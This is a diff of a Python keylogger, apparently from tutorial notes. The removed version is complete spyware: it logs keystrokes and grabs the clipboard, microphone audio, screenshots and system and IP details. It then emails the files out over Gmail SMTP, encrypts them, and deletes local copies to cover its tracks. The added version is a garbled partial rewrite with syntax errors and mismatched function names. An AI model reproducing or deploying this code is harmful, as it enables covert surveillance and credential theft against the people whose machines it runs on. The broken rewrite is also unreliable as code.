@@ -1,241 +1,141 @@
-# keylogger.py
-# Create an Advanced Keylogger in Python - Crash Course notes
-# Author: Grant Collins
-
 # Libraries
-
+# For Email - Module 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
+# Default Module
 import socket
 import platform
 
+# For Clipboard Module
 import win32clipboard
 
+# For Grabbing Keystroke
 from pynput.keyboard import Key, Listener
 
+# For Grabbing System Information(i.e time and system information)
 import time
 import os
 
+#For Microphone Capture
 from scipy.io.wavfile import write
 import sounddevice as sd
 
+# For Encrypt our file 
 from cryptography.fernet import Fernet
 
+# For Capturing Username and Password
 import getpass
 from requests import get
 
+# For Taking Screenshot 
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+#Default Variable
 keys_information = "key_log.txt"
-system_information = "syseminfo.txt"
-clipboard_information = "clipboard.txt"
-audio_information = "audio.wav"
-screenshot_information = "screenshot.png"
-
-keys_information_e = "e_key_log.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
-
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
-
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
-
-username = getpass.getuser()
-
-toaddr = " " # Enter the email address you want to send your information to
-
-key = " " # Generate an encryption key from the Cryptography folder
-
-file_path = " " # Enter the file path you want your files to be saved to
+system_information = "system_information.txt"
+file_path = "Directory where you want to save the file of log"
 extend = "\\"
-file_merge = file_path + extend
+email_address = "example@gmail.com"
+password = "1234"
+to_the_given_address = "sender@gmail.com"
 
-# email controls
-def send_email(filename, attachment, toaddr):
-
-    fromaddr = email_address
-
+def send_the_email(filename, attachment, to_the_given_address):
+    sender_address = email_address 
+    
     msg = MIMEMultipart()
-
-    msg['From'] = fromaddr
-
-    msg['To'] = toaddr
-
+    msg['From'] = sender_address
+    msg['To'] = to_the_given_address
     msg['Subject'] = "Log File"
-
-    body = "Body_of_the_mail"
-
+    body = "Body_of_the_Mail"
+    
     msg.attach(MIMEText(body, 'plain'))
-
     filename = filename
     attachment = open(attachment, 'rb')
-
+    
     p = MIMEBase('application', 'octet-stream')
-
     p.set_payload((attachment).read())
-
     encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
+    
+    # Adding the headers
+    p.add_header('Content-Disposition',"attachment: filename= %s" % filename)
     msg.attach(p)
-
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-
+    
+    # Creating an SMTP Session
+    s = smtplib.SMTP('smtp.gmail.com',587)
+    
+    # Starting our tls session
     s.starttls()
-
-    s.login(fromaddr, password)
-
+    
+    s.login(sender_address, password)
     text = msg.as_string()
-
-    s.sendmail(fromaddr, toaddr, text)
-
+    
+    s.sendmail(sender_address, to_the_given_address, text)
     s.quit()
-
-send_email(keys_information, file_path + extend + keys_information, toaddr)
-
-# get the computer information
-def computer_information():
-    with open(file_path + extend + system_information, "a") as f:
-        hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
-        try:
-            public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip)
-
-        except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query")
-
-        f.write("Processor: " + (platform.processor()) + '\n')
-        f.write("System: " + platform.system() + " " + platform.version() + '\n')
-        f.write("Machine: " + platform.machine() + "\n")
-        f.write("Hostname: " + hostname + "\n")
-        f.write("Private IP Address: " + IPAddr + "\n")
-
-computer_information()
-
-# get the clipboard contents
-def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
-        try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-
-            f.write("Clipboard Data: \n" + pasted_data)
-
-        except:
-            f.write("Clipboard could be not be copied")
-
-copy_clipboard()
-
-# get the microphone
-def microphone():
-    fs = 44100
-    seconds = microphone_time
-
-    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-    sd.wait()
-
-    write(file_path + extend + audio_information, fs, myrecording)
-
-# get screenshots
-def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
-
-screenshot()
+   
 
 
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
 
-# Timer for keylogger
-while number_of_iterations < number_of_iterations_end:
+send_email(keys_information, file_path + extend + keys_information,to_the_given_address)
 
-    count = 0
-    keys =[]
+def 
+    
+    
+    
+    
+    
+    
+    
 
-    def on_press(key):
-        global keys, count, currentTime
+# Constant
+key_count =0
+# Empty list
+keys = []
 
-        print(key)
-        keys.append(key)
-        count += 1
-        currentTime = time.time()
+def on_press(key):
+    global keys, key_count
+    
+    print(key)
+    keys.append(key)
+    key_count += 1
+    
+    if key_count >= 1:
+        key_count = 0
+        write_file(keys)
+        keys = []
+        
+    
+def write_to_file(keys):
+    with open(file_path + extend + keys_information, "a") as file:
+        for key in keys:
+            adding_each_keystroke_to_word = str(key).replace("'","")
+            if adding_each_keystroke_to_word.find("space") > 0 :
+                file.write('\n')
+                file.close()
+                
+             elif adding_each_keystroke_to_word.find("key") == -1:
+                file.write(adding_each_keystroke_to_word)
+                file.close()
+                
+ def  on_release(key):
+    if key == key.esc:
+        return False
+    
+ with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+    
+                
+                
+            
+    
+    
+    
 
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys =[]
 
-    def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write('\n')
-                    f.close()
-                elif k.find("Key") == -1:
-                    f.write(k)
-                    f.close()
 
-    def on_release(key):
-        if key == Key.esc:
-            return False
-        if currentTime > stoppingTime:
-            return False
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
 
-    if currentTime > stoppingTime:
-
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
-
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-
-        copy_clipboard()
-
-        number_of_iterations += 1
-
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
-
-# Encrypt files
-files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
-encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
-
-count = 0
-
-for encrypting_file in files_to_encrypt:
-
-    with open(files_to_encrypt[count], 'rb') as f:
-        data = f.read()
-
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-
-    with open(encrypted_file_names[count], 'wb') as f:
-        f.write(encrypted)
-
-    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
-    count += 1
-
-time.sleep(120)
-
-# Clean up our tracks and delete files
-delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-for file in delete_files:
-    os.remove(file_merge + file)
